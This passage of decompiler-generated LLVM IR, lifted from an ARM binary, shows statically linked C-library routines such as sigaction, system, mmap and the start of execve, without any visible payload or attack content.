  store i32 %v2_1a3ac, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1a3bc141 = inttoptr i32 %v2_1a3ac to i32*
  %v2_1a3bc142 = load i32, i32* %v1_1a3bc141, align 4
  store i32 %v2_1a3bc142, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1a3c0144 = icmp eq i32 %v2_1a3bc142, 0
  br i1 %v9_1a3c0144, label %dec_label_pc_1a3c8, label %dec_label_pc_1a3e0

dec_label_pc_1a3c8:                               ; preds = %.thread16, %dec_label_pc_1a3c8.dec_label_pc_1a3bc_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1a3d8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1a3d8, label %dec_label_pc_1a3dc, label %dec_label_pc_1a3c8.dec_label_pc_1a3bc_crit_edge

dec_label_pc_1a3c8.dec_label_pc_1a3bc_crit_edge:  ; preds = %dec_label_pc_1a3c8
  %v0_1a3bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1a3c0.pre = load i32, i32* @r4, align 4
  %v1_1a3bc = inttoptr i32 %v0_1a3bc.pre to i32*
  %v2_1a3bc = load i32, i32* %v1_1a3bc, align 4
  store i32 %v2_1a3bc, i32* %r3.global-to-local, align 4
  %v3_1a3c0 = icmp uge i32 %v2_1a3bc, %v1_1a3c0.pre
  store i1 %v3_1a3c0, i1* %cpsr_c.global-to-local, align 1
  %v9_1a3c0 = icmp eq i32 %v2_1a3bc, %v1_1a3c0.pre
  br i1 %v9_1a3c0, label %dec_label_pc_1a3c8, label %dec_label_pc_1a3e0

dec_label_pc_1a3dc:                               ; preds = %dec_label_pc_1a3c8
  %v0_1a3dc = load i32, i32* @r4, align 4
  store i32 %v0_1a3dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a3e0

dec_label_pc_1a3e0:                               ; preds = %.thread16, %dec_label_pc_1a3c8.dec_label_pc_1a3bc_crit_edge, %dec_label_pc_1a3dc
  %v0_1a3e0 = phi i32 [ %v0_1a3dc, %dec_label_pc_1a3dc ], [ %v2_1a3bc142, %.thread16 ], [ %v2_1a3bc, %dec_label_pc_1a3c8.dec_label_pc_1a3bc_crit_edge ]
  %v1_1a3e0 = phi i32 [ %v0_1a3dc, %dec_label_pc_1a3dc ], [ 0, %.thread16 ], [ %v1_1a3c0.pre, %dec_label_pc_1a3c8.dec_label_pc_1a3bc_crit_edge ]
  %v3_1a3e0 = icmp uge i32 %v0_1a3e0, %v1_1a3e0
  store i1 %v3_1a3e0, i1* %cpsr_c.global-to-local, align 1
  %v9_1a3e0 = icmp eq i32 %v0_1a3e0, %v1_1a3e0
  br i1 %v9_1a3e0, label %bb95, label %bb94

bb94:                                             ; preds = %dec_label_pc_1a3e0
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_1a3e0, %bb94
  store i32 107500, i32* @lr, align 4
  %v1_1a3e8 = xor i1 %v9_1a3e0, true
  call void @__pseudo_cond_branch(i1 %v1_1a3e8, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  store i32 27740, i32* %r2.global-to-local, align 4
  %v0_1a3f0 = load i32, i32* @r6, align 4
  %v2_1a3f0 = add i32 %v0_1a3f0, 27740
  %v3_1a3f0 = inttoptr i32 %v2_1a3f0 to i32*
  %v4_1a3f0 = load i32, i32* %v3_1a3f0, align 4
  store i32 %v4_1a3f0, i32* %r3.global-to-local, align 4
  %v1_1a3f4 = add i32 %v4_1a3f0, -1
  store i32 %v1_1a3f4, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1a3f8 = icmp eq i32 %v1_1a3f4, 0
  store i32 %v1_1a3f4, i32* %v3_1a3f0, align 4
  br i1 %v2_1a3f8, label %dec_label_pc_1a404, label %dec_label_pc_1a438

dec_label_pc_1a404:                               ; preds = %bb95
  %v0_1a408 = load i32, i32* @r7, align 4
  store i32 %v0_1a408, i32* %r2.global-to-local, align 4
  %v0_1a40c = load i32, i32* @r6, align 4
  %v2_1a40c = add i32 %v0_1a40c, 27700
  store i32 %v2_1a40c, i32* %r1.global-to-local, align 4
  %v3_1a414 = call i32 @__libc_sigaction(i32 2, i32 %v2_1a40c, i32 %v0_1a408)
  store i32 %v3_1a414, i32* @r5, align 4
  %v0_1a420 = load i32, i32* @r7, align 4
  store i32 %v0_1a420, i32* %r2.global-to-local, align 4
  %v0_1a424 = load i32, i32* @r6, align 4
  %v2_1a424 = add i32 %v0_1a424, 27720
  store i32 %v2_1a424, i32* %r1.global-to-local, align 4
  %v3_1a42c = call i32 @__libc_sigaction(i32 3, i32 %v2_1a424, i32 %v0_1a420)
  %v1_1a430 = load i32, i32* @r5, align 4
  %v2_1a430 = or i32 %v1_1a430, %v3_1a42c
  %v4_1a430 = icmp eq i32 %v2_1a430, 0
  br i1 %v4_1a430, label %dec_label_pc_1a438, label %dec_label_pc_1a450

dec_label_pc_1a438:                               ; preds = %dec_label_pc_1a404, %bb95
  %v0_1a438 = load i32, i32* @r4, align 4
  store i32 %v0_1a438, i32* %r2.global-to-local, align 4
  store i32 %v2_1a11c, i32* %r1.global-to-local, align 4
  %v4_1a444 = call i32 @__GI_sigprocmask(i32 2, i32* nonnull %stack_var_-48, i32 %v0_1a438)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1a448 = icmp eq i32 %v4_1a444, 0
  br i1 %v2_1a448, label %dec_label_pc_1a458, label %dec_label_pc_1a450

dec_label_pc_1a450:                               ; preds = %dec_label_pc_1a404, %dec_label_pc_1a438
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1a458

dec_label_pc_1a458:                               ; preds = %dec_label_pc_1a438, %dec_label_pc_1a450
  store i32 27744, i32* %r5.global-to-local, align 4
  %v0_1a45c = load i32, i32* @r6, align 4
  %v2_1a45c = add i32 %v0_1a45c, 27744
  store i32 %v2_1a45c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a460

dec_label_pc_1a460:                               ; preds = %dec_label_pc_1a490.dec_label_pc_1a460_crit_edge, %dec_label_pc_1a458
  %v0_1a468 = phi i32 [ %v0_1a468.pre, %dec_label_pc_1a490.dec_label_pc_1a460_crit_edge ], [ %v2_1a45c, %dec_label_pc_1a458 ]
  %v1_1a460 = phi i32 [ %v1_1a460.pre, %dec_label_pc_1a490.dec_label_pc_1a460_crit_edge ], [ 27744, %dec_label_pc_1a458 ]
  %v0_1a460 = phi i32 [ %v0_1a460.pre, %dec_label_pc_1a490.dec_label_pc_1a460_crit_edge ], [ %v0_1a45c, %dec_label_pc_1a458 ]
  %v2_1a460 = add i32 %v0_1a460, %v1_1a460
  %v3_1a460 = inttoptr i32 %v2_1a460 to i32*
  %v4_1a460 = load i32, i32* %v3_1a460, align 4
  store i32 %v4_1a460, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1a468, i32* %r2.global-to-local, align 4
  %v1_1a46c128 = inttoptr i32 %v0_1a468 to i32*
  %v2_1a46c129 = load i32, i32* %v1_1a46c128, align 4
  store i32 %v2_1a46c129, i32* %r3.global-to-local, align 4
  %v3_1a470131 = icmp uge i32 %v2_1a46c129, %v4_1a460
  store i1 %v3_1a470131, i1* %cpsr_c.global-to-local, align 1
  %v9_1a470137 = icmp eq i32 %v2_1a46c129, %v4_1a460
  br i1 %v9_1a470137, label %dec_label_pc_1a478, label %dec_label_pc_1a490

dec_label_pc_1a478:                               ; preds = %dec_label_pc_1a460, %dec_label_pc_1a478.dec_label_pc_1a46c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1a488 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1a488, label %dec_label_pc_1a48c, label %dec_label_pc_1a478.dec_label_pc_1a46c_crit_edge

dec_label_pc_1a478.dec_label_pc_1a46c_crit_edge:  ; preds = %dec_label_pc_1a478
  %v0_1a46c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1a470.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1a46c = inttoptr i32 %v0_1a46c.pre to i32*
  %v2_1a46c = load i32, i32* %v1_1a46c, align 4
  store i32 %v2_1a46c, i32* %r3.global-to-local, align 4
  %v3_1a470 = icmp uge i32 %v2_1a46c, %v1_1a470.pre
  store i1 %v3_1a470, i1* %cpsr_c.global-to-local, align 1
  %v9_1a470 = icmp eq i32 %v2_1a46c, %v1_1a470.pre
  br i1 %v9_1a470, label %dec_label_pc_1a478, label %dec_label_pc_1a490

dec_label_pc_1a48c:                               ; preds = %dec_label_pc_1a478
  %v0_1a48c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1a48c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a490

dec_label_pc_1a490:                               ; preds = %dec_label_pc_1a460, %dec_label_pc_1a478.dec_label_pc_1a46c_crit_edge, %dec_label_pc_1a48c
  %v0_1a498 = phi i32 [ %v0_1a48c, %dec_label_pc_1a48c ], [ %v2_1a46c129, %dec_label_pc_1a460 ], [ %v2_1a46c, %dec_label_pc_1a478.dec_label_pc_1a46c_crit_edge ]
  %v1_1a490 = phi i32 [ %v0_1a48c, %dec_label_pc_1a48c ], [ %v4_1a460, %dec_label_pc_1a460 ], [ %v1_1a470.pre, %dec_label_pc_1a478.dec_label_pc_1a46c_crit_edge ]
  %v3_1a490 = icmp uge i32 %v0_1a498, %v1_1a490
  store i1 %v3_1a490, i1* %cpsr_c.global-to-local, align 1
  %v9_1a490 = icmp eq i32 %v0_1a498, %v1_1a490
  br i1 %v9_1a490, label %dec_label_pc_1a498, label %dec_label_pc_1a490.dec_label_pc_1a460_crit_edge

dec_label_pc_1a490.dec_label_pc_1a460_crit_edge:  ; preds = %dec_label_pc_1a490
  %v0_1a460.pre = load i32, i32* @r6, align 4
  %v1_1a460.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1a468.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a460

dec_label_pc_1a498:                               ; preds = %dec_label_pc_1a490
  %v2_1a498 = icmp ne i32 %v1_1a490, 0
  store i1 %v2_1a498, i1* %cpsr_c.global-to-local, align 1
  %v7_1a49c = icmp slt i32 %v1_1a490, 2
  br i1 %v7_1a49c, label %dec_label_pc_1a4b8, label %dec_label_pc_1a4a0

dec_label_pc_1a4a0:                               ; preds = %dec_label_pc_1a498
  %v0_1a4a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a4a4 = add i32 %v0_1a4a4, 129
  store i32 %v1_1a4a4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a4b8

dec_label_pc_1a4b8:                               ; preds = %dec_label_pc_1a4a0, %dec_label_pc_1a498
  %v3_1a4b8 = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1a4bc

dec_label_pc_1a4bc:                               ; preds = %dec_label_pc_1a20c, %dec_label_pc_1a214, %dec_label_pc_1a4b8
  %storemerge = phi i32 [ %v3_1a4b8, %dec_label_pc_1a4b8 ], [ -1, %dec_label_pc_1a214 ], [ -1, %dec_label_pc_1a20c ]
  store i32 %v3_19fc0, i32* @r4, align 4
  store i32 %v6_19fc0, i32* @r5, align 4
  store i32 %v9_19fc0, i32* @r6, align 4
  store i32 %v12_19fc0, i32* @r7, align 4
  store i32 %v15_19fc0, i32* @r8, align 4
  store i32 %v21_19fc0, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1a48c, { 1, 0, 2 }
  uselistorder i32 %v1_1a470.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1a3dc, { 1, 0, 2 }
  uselistorder i32 %v1_1a3c0.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1a344, { 1, 0, 2 }
  uselistorder i32 %v0_1a238, { 1, 0, 2 }
  uselistorder i32 %v0_1a200, { 1, 0, 2 }
  uselistorder i32 %v1_1a1e4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1a15c, { 1, 0, 2 }
  uselistorder i32 %v1_1a140.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1a0e0, { 1, 0, 2 }
  uselistorder i32 %v1_1a0c4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1a020, { 1, 0, 2 }
  uselistorder i32 %v1_1a004.pre, { 0, 2, 1 }
  uselistorder i32 %v2_19fc8, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-100, { 1, 0, 2 }
  uselistorder i32* %stack_var_-88, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 46, 4, 5, 6, 8, 7, 47, 10, 9, 12, 11, 13, 14, 15, 16, 17, 18, 19, 21, 20, 44, 22, 23, 24, 25, 26, 27, 29, 28, 45, 30, 31, 32, 34, 33, 48, 35, 36, 37, 38, 39, 40, 42, 41, 49, 43 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 34, 35, 4, 5, 6, 7, 36, 37, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16, 17, 30, 31, 18, 19, 20, 32, 33, 21, 22, 23, 24, 38, 39, 25, 26, 27, 28, 29, 40, 41 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 4, 3, 0 }
  uselistorder i32 -98744, { 1, 0, 2 }
  uselistorder i32 27720, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 9, 8, 7, 6, 5, 4, 2, 1, 3, 0, 10 }
  uselistorder i32 27740, { 0, 3, 1, 4, 2, 5, 6, 7 }
  uselistorder i32 27744, { 1, 3, 8, 4, 9, 0, 6, 11, 2, 5, 10, 7, 12, 13, 14 }
  uselistorder label %dec_label_pc_1a4bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a490, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a478, { 1, 0 }
  uselistorder label %dec_label_pc_1a458, { 1, 0 }
  uselistorder label %dec_label_pc_1a450, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %dec_label_pc_1a3e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a3c8, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %dec_label_pc_1a38c, { 1, 0 }
  uselistorder label %dec_label_pc_1a378, { 1, 0 }
  uselistorder label %dec_label_pc_1a204, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a1ec, { 1, 0 }
  uselistorder label %dec_label_pc_1a1cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a1a8, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %dec_label_pc_1a160, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a148, { 1, 0 }
  uselistorder label %dec_label_pc_1a0e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a0cc, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_1a024, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a00c, { 1, 0 }
}

define i32 @function_1a4cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a4cc:
  %v0_1a4cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a4cc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1a4cc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1a4cc, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_1a50c = load i32, i32* @r4, align 4
  %v6_1a50c = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_1a514 = icmp eq i32 %arg1, 0
  br i1 %v2_1a514, label %dec_label_pc_1a524, label %dec_label_pc_1a53c

dec_label_pc_1a524:                               ; preds = %entry
  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -35580), i32* @r0, align 4
  %v0_1a52c = call i32 @do_system()
  %v1_1a530 = sub i32 1, %v0_1a52c
  %v2_1a530 = icmp ult i32 %v0_1a52c, 2
  br i1 %v2_1a530, label %dec_label_pc_1a574, label %bb

bb:                                               ; preds = %dec_label_pc_1a524
  br label %dec_label_pc_1a574

dec_label_pc_1a53c:                               ; preds = %entry
  %v4_1a540 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 30124) to i32*), align 4
  %v2_1a544 = icmp eq i32 %v4_1a540, 0
  br i1 %v2_1a544, label %dec_label_pc_1a54c, label %dec_label_pc_1a558

dec_label_pc_1a54c:                               ; preds = %dec_label_pc_1a53c
  store i32 %v6_1a50c, i32* @r5, align 4
  %v0_1a554 = call i32 @do_system()
  br label %dec_label_pc_1a558

dec_label_pc_1a558:                               ; preds = %dec_label_pc_1a53c, %dec_label_pc_1a54c
  %v0_1a558 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1a558, i32* @r4, align 4
  %v0_1a560 = load i32, i32* @r5, align 4
  store i32 %v0_1a560, i32* @r0, align 4
  %v0_1a564 = call i32 @do_system()
  store i32 %v0_1a564, i32* @r5, align 4
  %v0_1a56c = load i32, i32* @r4, align 4
  %v1_1a570 = call i32 @__libc_disable_asynccancel(i32 %v0_1a56c)
  %v0_1a574.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a574

dec_label_pc_1a574:                               ; preds = %bb, %dec_label_pc_1a524, %dec_label_pc_1a558
  %v0_1a574 = phi i32 [ 0, %bb ], [ %v1_1a530, %dec_label_pc_1a524 ], [ %v0_1a574.pre, %dec_label_pc_1a558 ]
  store i32 %v3_1a50c, i32* @r4, align 4
  store i32 %v6_1a50c, i32* @r5, align 4
  ret i32 %v0_1a574

; uselistorder directives
  uselistorder i32 %v0_1a52c, { 1, 0 }
  uselistorder i32 %v6_1a50c, { 1, 0 }
  uselistorder i32 ()* @do_system, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1a574, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a558, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a590 = load i32, i32* @r4, align 4
  store i32 %v3_1a590, i32* %stack_var_-16, align 4
  %v3_1a59c = urem i32 %arg4, 4096
  %v2_1a5a0 = icmp eq i32 %v3_1a59c, 0
  br i1 %v2_1a5a0, label %dec_label_pc_1a5c4, label %dec_label_pc_1a5a8

dec_label_pc_1a5a8:                               ; preds = %entry
  %v0_1a5ac = call i32 @__aeabi_read_tp()
  store i32 %v0_1a5ac, i32* %r0.global-to-local, align 4
  %v3_1a5b0 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a5b0 = sext i16 %v3_1a5b0 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_1a5bc = add i32 %v4_1a5b0, %v0_1a5ac
  %v4_1a5bc = inttoptr i32 %v3_1a5bc to i32*
  store i32 22, i32* %v4_1a5bc, align 4
  %v0_1a5f8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a5f8

dec_label_pc_1a5c4:                               ; preds = %entry
  %v0_1a5d4 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a5d4, -4095
  br i1 %tmp, label %dec_label_pc_1a5f4, label %dec_label_pc_1a5dc

dec_label_pc_1a5dc:                               ; preds = %dec_label_pc_1a5c4
  %v1_1a5e0 = sub i32 0, %v0_1a5d4
  %v3_1a5e4 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a5e4 = sext i16 %v3_1a5e4 to i32
  %v0_1a5e8 = call i32 @__aeabi_read_tp()
  %v3_1a5ec = add i32 %v4_1a5e4, %v0_1a5e8
  %v4_1a5ec = inttoptr i32 %v3_1a5ec to i32*
  store i32 %v1_1a5e0, i32* %v4_1a5ec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a5f4

dec_label_pc_1a5f4:                               ; preds = %dec_label_pc_1a5c4, %dec_label_pc_1a5dc
  %v0_1a5f4 = phi i32 [ %v0_1a5d4, %dec_label_pc_1a5c4 ], [ -1, %dec_label_pc_1a5dc ]
  store i32 %v0_1a5f4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a5f8

dec_label_pc_1a5f8:                               ; preds = %dec_label_pc_1a5a8, %dec_label_pc_1a5f4
  %v0_1a5f8 = phi i32 [ %v0_1a5f8.pre, %dec_label_pc_1a5a8 ], [ %v0_1a5f4, %dec_label_pc_1a5f4 ]
  store i32 %v0_1a5f8, i32* %r0.global-to-local, align 4
  %v2_1a5fc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a5fc, i32* @r4, align 4
  ret i32 %v0_1a5f8

; uselistorder directives
  uselistorder i32 %v0_1a5f8, { 1, 0 }
  uselistorder i32 %v0_1a5d4, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_1a5f8, { 1, 0 }
  uselistorder label %dec_label_pc_1a5f4, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_1a60c = load i32, i32* @lr, align 4
  store i32 %v0_1a60c, i32* %stack_var_-4, align 4
  %v0_1a614 = load i32, i32* @r0, align 4
  %v3_1a618 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a618 = sext i16 %v3_1a618 to i32
  store i32 %v4_1a618, i32* @r2, align 4
  %v0_1a61c = call i32 @__aeabi_read_tp()
  %v1_1a620 = sub i32 0, %v0_1a614
  store i32 %v1_1a620, i32* @r3, align 4
  %v2_1a624 = load i32, i32* @r2, align 4
  %v3_1a624 = add i32 %v2_1a624, %v0_1a61c
  %v4_1a624 = inttoptr i32 %v3_1a624 to i32*
  store i32 %v1_1a620, i32* %v4_1a624, align 4
  %v2_1a62c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_1a62c, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1a638 = load i32, i32* @r4, align 4
  %v6_1a638 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1a640 = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1a640, label %dec_label_pc_1a694, label %dec_label_pc_1a658

dec_label_pc_1a658:                               ; preds = %entry
  %v1_1a658 = add i32 %arg2, 4
  %v2_1a658 = inttoptr i32 %v1_1a658 to i32*
  %v3_1a658 = load i32, i32* %v2_1a658, align 4
  store i32 %v3_1a658, i32* @r3, align 4
  %v1_1a65c = and i32 %v3_1a658, 67108864
  %v2_1a65c = icmp eq i32 %v1_1a65c, 0
  br i1 %v2_1a65c, label %dec_label_pc_1a664, label %dec_label_pc_1a694

dec_label_pc_1a664:                               ; preds = %dec_label_pc_1a658
  store i32 20, i32* @r2, align 4
  %v2_1a668 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1a668, i32* @r0, align 4
  %v0_1a66c = call i32 @memcpy()
  %v0_1a694.pre = load i32, i32* @r5, align 4
  %v0_1a69c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a694

dec_label_pc_1a694:                               ; preds = %dec_label_pc_1a658, %entry, %dec_label_pc_1a664
  %v0_1a69c = phi i32 [ %arg3, %dec_label_pc_1a658 ], [ %arg3, %entry ], [ %v0_1a69c.pre, %dec_label_pc_1a664 ]
  %v0_1a698 = phi i32 [ %arg2, %dec_label_pc_1a658 ], [ 0, %entry ], [ %v2_1a668, %dec_label_pc_1a664 ]
  %v0_1a694 = phi i32 [ %arg1, %dec_label_pc_1a658 ], [ %arg1, %entry ], [ %v0_1a694.pre, %dec_label_pc_1a664 ]
  %v4_1a6a4 = call i32 @__syscall_rt_sigaction(i32 %v0_1a694, i32 %v0_1a698, i32 %v0_1a69c, i32 8)
  store i32 %v3_1a638, i32* @r4, align 4
  store i32 %v6_1a638, i32* @r5, align 4
  ret i32 %v4_1a6a4

; uselistorder directives
  uselistorder label %dec_label_pc_1a694, { 2, 0, 1 }
}

define i32 @function_1a6b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a6b8:
  %v0_1a6b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a6b8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a6b8
  %v1_1a6b8 = load i32, i32* @r4, align 4
  %v3_1a6b8 = mul i32 %v1_1a6b8, %arg1
  %v2_1a6bc = load i32, i32* @r8, align 4
  %v4_1a6bc = mul i32 %v2_1a6bc, 2
  %v5_1a6bc = and i32 %v4_1a6bc, %v3_1a6b8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a6b8, %bb
  %v6_1a6bc = phi i32 [ %arg1, %dec_label_pc_1a6b8 ], [ %v5_1a6bc, %bb ]
  ret i32 %v6_1a6bc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_1a6c4 = call i32 @__sigsetjmp()
  ret i32 %v0_1a6c4
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_1a6dc = load i32, i32* @r0, align 4
  ret i32 %v0_1a6dc
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a6f0 = load i32, i32* @r7, align 4
  store i32 %v3_1a6f0, i32* %stack_var_-8, align 4
  %v0_1a6fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a6fc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1a6fc, -4095
  br i1 %tmp, label %dec_label_pc_1a724, label %dec_label_pc_1a70c

dec_label_pc_1a70c:                               ; preds = %entry
  %v0_1a710 = call i32 @__aeabi_read_tp()
  %v3_1a714 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1a714 = sext i16 %v3_1a714 to i32
  %v0_1a718 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a718 = sub i32 0, %v0_1a718
  store i32 %v1_1a718, i32* %r2.global-to-local, align 4
  %v3_1a71c = add i32 %v4_1a714, %v0_1a710
  %v4_1a71c = inttoptr i32 %v3_1a71c to i32*
  store i32 %v1_1a718, i32* %v4_1a71c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1a724.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1a724

dec_label_pc_1a724:                               ; preds = %entry, %dec_label_pc_1a70c
  %v1_1a728 = phi i32 [ %v0_1a6fc, %entry ], [ -1, %dec_label_pc_1a70c ]
  %v2_1a724 = phi i32 [ %v3_1a6f0, %entry ], [ %v2_1a724.pre, %dec_label_pc_1a70c ]
  store i32 %v2_1a724, i32* @r7, align 4
  ret i32 %v1_1a728

; uselistorder directives
  uselistorder i32 %v0_1a6fc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a724, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1a764, label %dec_label_pc_1a74c

dec_label_pc_1a74c:                               ; preds = %entry
  %v0_1a750 = call i32 @__aeabi_read_tp()
  %v3_1a754 = load i16, i16* @global_var_32088.1320, align 2
